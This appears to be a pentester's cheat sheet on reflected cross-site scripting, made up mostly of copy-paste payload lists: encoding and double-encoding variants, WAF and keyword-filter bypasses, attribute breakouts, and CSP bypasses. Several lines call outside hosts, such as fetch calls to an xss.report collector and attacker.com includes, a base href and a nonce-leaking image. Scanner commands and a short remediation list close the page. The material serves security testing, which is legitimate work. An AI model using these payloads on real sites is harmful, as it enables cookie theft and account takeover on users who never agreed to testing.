---
title: "Reflected XSS: Bypass & Encoding Arsenal"
date: 2026-02-24
draft: false
---

# Reflected XSS: Bypass & Encoding Arsenal

> **Severity**: High | **CWE**: CWE-79 | **OWASP**: A03:2021
> **Reference**: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---

## How Sanitization Works — Read This First

Before throwing payloads, understand what the filter does. Send this canary and read the raw response:

```
Probe: '<>"/;`&=(){}[]
```

Map each character:

| Character | Encoded to | Filter type |
|-----------|-----------|-------------|
| `<` → `&lt;` | HTML encode | htmlspecialchars / HtmlEncode |
| `<` → removed | Strip | strip_tags / regex replace |
| `<` → `%3C` | URL encode | URL filter on reflected param |
| unchanged | Nothing | Vulnerable directly |

**Encoding layers in a real app:**
```
User input → (1) Client-side JS validation [bypass: use Burp]
           → (2) Server-side input filter  [bypass: encoding, mutation]
           → (3) Database storage          [may alter charset/encoding]
           → (4) Template output encoding  [bypass: wrong context]
           → (5) Browser parsing           [mXSS: re-parse differences]
```

Each layer can be defeated independently. A filter at layer 2 with no encoding at layer 4 = still vulnerable.

---

## Determine Injection Context from Source

Always `Ctrl+U` or view Burp response — find your reflected input:

```
Context A — HTML body:       <p>REFLECTED</p>
Context B — Double-quoted:   <input value="REFLECTED">
Context C — Single-quoted:   <input value='REFLECTED'>
Context D — Unquoted attr:   <input value=REFLECTED>
Context E — JS double-quot:  var x = "REFLECTED";
Context F — JS single-quot:  var x = 'REFLECTED';
Context G — JS no quotes:    var x = REFLECTED;
Context H — href/src:        <a href="REFLECTED">
Context I — <script> block:  <script>REFLECTED</script>
Context J — HTML comment:    <!-- REFLECTED -->
Context K — CSS:             <style>body{color:REFLECTED}</style>
```

---

## Master Payload Table — Encoding Variants

Every row = same attack, different encoding. Use the one that bypasses the specific filter.

### `<script>` Based

```
[RAW]
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>confirm('xss')</script>

[HTML ENTITY — decimal]
&#60;script&#62;alert(1)&#60;/script&#62;
&#60;script&#62;alert(document.domain)&#60;/script&#62;

[HTML ENTITY — hex]
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
&#x3c;script&#x3e;alert(document.domain)&#x3c;/script&#x3e;

[HTML ENTITY — hex zero-padded]
&#x003c;script&#x003e;alert(1)&#x003c;/script&#x003e;
&#x003c;script&#x003e;alert(document.domain)&#x003c;/script&#x003e;

[HTML ENTITY — no semicolons]
&#60script&#62alert(1)&#60/script&#62
&#x3cscript&#x3ealert(1)&#x3c/script&#x3e

[URL ENCODED]
%3Cscript%3Ealert(1)%3C%2Fscript%3E
%3cscript%3ealert(document.domain)%3c%2fscript%3e

[DOUBLE URL ENCODED]
%253Cscript%253Ealert(1)%253C%252Fscript%253E
%253cscript%253ealert(1)%253c%252fscript%253e

[URL ENCODED + HTML ENTITY MIXED]
%26%23x3c%3Bscript%26%23x3e%3Balert(1)%26%23x3c%3B%2Fscript%26%23x3e%3B

[UNICODE — JS context]
\u003cscript\u003ealert(1)\u003c/script\u003e

[HTML COMMENT INJECTION — bypass keyword filters]
<scr<!---->ipt>alert(1)</scr<!---->ipt>
<scr<!--esi-->ipt>alert(1)</script>
<scr/**/ipt>alert(1)</scr/**/ipt>
```

### `<img>` onerror Based

```
[RAW]
<img src=x onerror=alert(1)>
<img src=1 onerror=confirm(1)>
<img src=x onerror=alert(document.domain)>
<img src=x onerror=alert(document.cookie)>

[HTML ENTITY — hex on angle brackets only]
&#x3c;img src=x onerror=alert(1)&#x3e;
&#x3c;img src=1 onerror=confirm(1)&#x3e;

[HTML ENTITY — hex zero-padded]
&#x003c;img src=1 onerror=confirm(1)&#x003e;
&#x003c;img src=x onerror=alert(document.domain)&#x003e;

[HTML ENTITY — full attribute value encoded]
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<img src=x onerror=&#97&#108&#101&#114&#116&#40&#49&#41>

[URL ENCODED]
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
%3Cimg+src%3D1+onerror%3Dconfirm(1)%3E

[DOUBLE URL ENCODED]
%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
%253cimg%2520src%253d1%2520onerror%253dconfirm%25281%2529%253e

[URL ENCODED + HTML ENTITY COMBINED]
%26%23x003c%3Bimg%20src%3D1%20onerror%3Dalert(1)%26%23x003e%3B
%26%23x003c%3Bimg%20src%3D1%20onerror%3Dconfirm(1)%26%23x003e%3B%0A

[TRIPLE LAYER — URL encode of URL+HTML]
%2526%2523x003c%253Bimg%2520src%253D1%2520onerror%253Dalert(1)%2526%2523x003e%253B

[EVENT HANDLER VALUE — HTML entity encoded]
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="&#x61;l&#x65;rt&#x28;1&#x29;">
<img src=x onerror="al&#101;rt(1)">

[UNICODE escape in event handler]
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
<img src=x onerror="\u{61}lert(1)">

[HEX escape in event handler]
<img src=x onerror="\x61\x6c\x65\x72\x74(1)">

[BASE64 eval]
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">
```

### `<svg>` Based

```
[RAW]
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg onload=confirm(1)>

[HTML ENTITY — brackets]
&#x3c;svg onload=alert(1)&#x3e;
&#x003c;svg onload=alert(document.domain)&#x003e;

[URL ENCODED]
%3Csvg%20onload%3Dalert(1)%3E
%3Csvg%2Fonload%3Dalert(1)%3E

[DOUBLE URL ENCODED — for double-decode sinks]
%253Csvg%2520onload%253Dalert(1)%253E
%253CSvg%2520O%256ELoad%253Dconfirm%2528/xss/%2529%253E

[CASE VARIATION + DOUBLE ENCODE — WAF bypass]
%253CSvg%2520OnLoAd%253Dalert(1)%253E
x%22%3E%3CSvg%20OnLoad%3Dconfirm(1)%3E
x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253Dconfirm%2528/xss/%2529%253E

[ATTRIBUTE VALUE — HTML entity encoded]
<svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
```

### Breaking Out of Attribute Contexts

```
[BREAK OUT OF double-quoted attribute]
RAW:         "><img src=x onerror=alert(1)>
URL encoded: %22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
Dbl encode:  %2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E

[BREAK OUT OF single-quoted attribute]
RAW:         '><img src=x onerror=alert(1)>
URL encoded: %27%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

[STAY IN ATTRIBUTE — inject event handler]
RAW:         " onmouseover="alert(1)
URL encoded: %22%20onmouseover%3D%22alert(1)
RAW:         " autofocus onfocus="alert(1)
URL encoded: %22%20autofocus%20onfocus%3D%22alert(1)

[BREAK OUT then full encoded SVG]
x">&#x3c;svg onload=alert(1)&#x3e;<!--
x%22%3E&#x3c;svg%20onload%3Dalert(1)&#x3e;
```

### `<embed>`, `<object>`, `<base>` Tricks

```
[EMBED with javascript src]
<embed src=javascript:alert(1)>
<embed src="javascript:alert(document.domain)">

[EMBED with partial path trick]
<embed src=/x//alert(1)>

[BASE href poisoning — poisons all relative URLs]
<base href="javascript:\
<!-- Any relative <script src="path.js"> becomes javascript:\path.js -->
<base href="javascript:alert(1)//">

[OBJECT data]
<object data=javascript:alert(1)>
<object data="javascript:alert(document.cookie)">
&#x3c;object data=javascript:alert(1)&#x3e;

[EMBED + BASE combined]
<embed src=/x//alert(1)><base href="javascript:\
```

---

## Comment & ESI Injection Bypasses

These techniques break keyword detection by inserting content inside the tag that most WAFs/filters don't account for.

```
[HTML COMMENT INSIDE TAG — breaks WAF string matching]
<scr<!---->ipt>alert(1)</scr<!---->ipt>
<scr<!-- foo -->ipt>alert(1)</script>
<scr<!--esi-->ipt>alert(1)</script>
<img <!----> src=x onerror=alert(1)>
<svg<!----> onload=alert(1)>

[ESI INCLUDE — server-side injection if ESI enabled]
<esi:include src="http://attacker.com/xss.html"/>
<esi:vars>$(HTTP_HOST)</esi:vars>
<esi:include src="javascript:alert(1)"/>
x=<esi:vars name="$(QUERY_STRING{x})"/>

[CONDITIONAL COMMENT — IE legacy]
<!--[if IE]><script>alert(1)</script><![endif]-->
<!--[if gte IE 6]><img src=x onerror=alert(1)><![endif]-->

[CDATA — XML/SVG context]
<svg><script>//<![CDATA[
alert(1)
//]]></script></svg>
<svg><script>alert&lpar;1&rpar;</script></svg>

[PROCESSING INSTRUCTION — XML context]
<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="javascript:alert(1)"?>
```

---

## javascript: URI — Full Encoding Matrix

```
[RAW]
javascript:alert(1)
javascript:alert(document.cookie)

[CASE VARIATION — some parsers case-fold]
JavaScript:alert(1)
JAVASCRIPT:alert(1)
JaVaScRiPt:alert(1)

[HTML ENTITY — colon encoded]
javascript&#58;alert(1)
javascript&#x3A;alert(1)
javascript&#x003A;alert(1)

[FULL HTML ENTITY]
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)

[WHITESPACE INJECTION — tab, newline, carriage return before colon or inside]
java	script:alert(1)       ← TAB (0x09)
java
script:alert(1)               ← NEWLINE (0x0a)
java script:alert(1)          ← SPACE (some parsers)
java%09script:alert(1)
java%0ascript:alert(1)
java%0dscript:alert(1)
java%0d%0ascript:alert(1)

[URL ENCODED]
javascript%3Aalert(1)
%6Aavascript:alert(1)
%6a%61%76%61%73%63%72%69%70%74%3aalert(1)

[DOUBLE URL ENCODED]
javascript%253Aalert(1)
%256Aavascript%253Aalert(1)

[ZERO-WIDTH CHARACTERS]
javascript:alert(1)  ← with U+200B zero-width space
javascript\u200balert(1)

[MIXED HTML+URL]
java%09script&#58;alert(1)
&#x6A;ava%09script&#x3A;alert(1)
```

---

## WAF Bypass Techniques

### `alert` Keyword Blocked

```javascript
confirm(1)              confirm`1`
prompt(1)               prompt`1`
(alert)(1)              top[`al`+`ert`](1)
window['alert'](1)      window['\x61\x6c\x65\x72\x74'](1)
window['\141\154\145\162\164'](1)
eval('ale'+'rt(1)')
eval(atob('YWxlcnQoMSk='))
setTimeout(alert,0)
[1].find(alert)
[].constructor.constructor('alert(1)')()
Function('alert(1)')()
new Function`alert\`1\``()
throw onerror=alert,1
window.onerror=alert;throw 1
```

### `<script>` / `onerror` / Specific Tags Blocked

```html
-- Use less-common HTML5 event handlers:
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)><summary>x</summary></details>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=1>
<video><source onerror=alert(1)>
<audio src onerror=alert(1)>
<body onpageshow=alert(1)>
<body onhashchange=alert(1)><a href=#>x</a>
<body onfocus=alert(1) contenteditable autofocus>
<marquee onstart=alert(1)>
<object data="data:text/html,<script>alert(1)</script>">
<iframe srcdoc="<img src=x onerror=alert(1)>">
<iframe src="data:text/html,<script>alert(1)</script>">
<math href=javascript:alert(1)>click</math>
<table background=javascript:alert(1)>
<form action=javascript:alert(1)><input type=submit>
<button formaction=javascript:alert(1)>click</button>
<isindex type=image src=1 onerror=alert(1)>
<input type=image src onerror=alert(1)>
```

### Spaces Blocked

```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<img	src=x	onerror=alert(1)>      ← TAB
<img%09src=x%09onerror=alert(1)>
<img
src=x
onerror=alert(1)>
```

### Quotes Blocked (`'` and `"` both filtered)

```javascript
-- In attribute: no quotes needed
<img src=x onerror=alert(1)>
<svg onload=alert(document.domain)>

-- In JS context: backtick
alert`1`
confirm`document.domain`
fetch`https://attacker.com`

-- Fromcharcode without quotes:
String.fromCharCode(88,83,83)
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

### Parentheses `()` Blocked

```javascript
alert`1`
confirm`1`
throw onerror=alert,1
window.onerror=eval;throw'=alert\x281\x29'
[1].find(alert)
[1].forEach(alert)
setTimeout`alert\x281\x29`
```

### Angle Brackets `<>` Blocked (pure attribute injection)

```
-- Already inside an attribute? No brackets needed:
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onpointerover="alert(1)
' onmouseover='alert(1)
```

---

## Full Double-Layer Encoded Payloads (Copy-Paste Ready)

These represent real payloads used to bypass WAFs that do one round of decoding before inspection:

```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
%253Csvg%2520onload%253Dalert(1)%253E
%253Cdetails%2520open%2520ontoggle%253Dalert(1)%253E
%253Ciframe%2520src%253Djavascript%253Aalert(1)%253E

-- WAF string match bypass via case + double encode:
%253CSvg%2520O%256ELoad%253Dconfirm%2528/xss/%2529%253E
%253CSCRIPT%253Ealert%2528document.domain%2529%253C%252FSCRIPT%253E

-- Attribute breakout + encoded SVG:
x%22%3E%3CSvg%20OnLoad%3Dconfirm(1)%3E
x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253Dconfirm%2528/xss/%2529%253E
```

---

## Quick Payload Reference — Copy-Paste Arsenal

```html
<!-- HTML Entity Encoding -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
&#x22; onerror=&#x22;fetch(&#x27;https://xss.report/c/blitz&#x27;)&#x22;
&lt;img src=&quot;x&quot; alt=&quot;&#x22; onerror=&#x22;fetch(&#x27;https://xss.report/c/blitz&#x27;)&#x22;&quot; /&gt;

<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Unicode Escape -->
\u003Cscript\u003Ealert(1)\u003C/script\u003E

<!-- Dynamic Concatenation (breaks string matching) -->
<scr + ipt>alert(1)</scr + ipt>

<!-- Spaces / Junk Chars in tag name -->
<scr ipt>alert(1)</scr ipt>

<!-- SVG wrapper -->
<svg><script>alert(1)</script></svg>

<!-- JS event via this.src reassignment -->
<img src="x" onerror="this.src='javascript:alert(1)'">

<!-- Inline attribute focus -->
<input value="XSS" onfocus="alert('XSS')">

<!-- CSS Expression (IE legacy) -->
<div style="width:expression(alert(1));">Test</div>

<!-- Body onload -->
<body onload="alert('XSS')">
```

---

## CSP Bypass Quick Reference

```
# Always check first:
curl -si https://target.com | grep -i content-security-policy

[JSONP bypass — script-src 'self']
<script src="/api/callback?cb=alert(1)//"></script>
<script src="/?callback=alert(1)&format=jsonp"></script>

[Angular CDN — if cdnjs in script-src]
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.min.js"></script>
<div ng-app>{{$eval.constructor('alert(1)')()}}</div>

[base-uri missing — base href hijack]
<base href="//attacker.com/">

[object-src missing]
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">

[unsafe-eval present]
eval('alert(1)')
setTimeout('alert(1)',0)
new Function('alert(1)')()

[Dangling markup nonce leak — exfiltrate nonce then reuse]
<img src="https://attacker.com/?nonce=
```

---

## Tools

```bash
# PortSwigger XSS Cheat Sheet — filterable by tag, event, browser:
# https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

# Burp Suite:
# - Proxy → Repeater: test encoded payloads manually
# - Intruder: payload list from PortSwigger cheat sheet export
# - Scanner: Active scan for reflected XSS
# - DOM Invader: browser-based source/sink tracing
# Extensions: XSS Validator, Reflected Parameters, CSP Auditor, Backslash Powered Scanner

# dalfox — context-aware scanner + WAF evasion:
dalfox url "https://target.com/search?q=test"
dalfox url "https://target.com/search?q=test" --waf-evasion
dalfox url "https://target.com/search?q=test" --remote-payloads portswigger
dalfox url "https://target.com/search?q=test" --encode-url

# XSStrike — smart fuzzer with encoding awareness:
python xsstrike.py -u "https://target.com/page?q=test" --fuzzer

# kxss + waybackurls pipeline:
echo "target.com" | waybackurls | kxss

# CSP evaluator:
# https://csp-evaluator.withgoogle.com/

# URL encoder tool:
python3 -c "import urllib.parse; print(urllib.parse.quote('<img src=x onerror=alert(1)>'))"
python3 -c "import urllib.parse; print(urllib.parse.quote(urllib.parse.quote('<img src=x onerror=alert(1)>')))"

# HTML entity encoder:
python3 -c "import html; print(html.escape('<img src=x onerror=alert(1)>'))"
```

---

## Remediation Reference

- Output-encode **at the point of rendering**, in the correct context (HTML/JS/URL)
- CSP: `script-src 'nonce-RANDOM' 'strict-dynamic'; object-src 'none'; base-uri 'none'`
- HttpOnly + SameSite=Strict on session cookies
- Never trust denylist-based filters — they are all bypassable

*PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet*
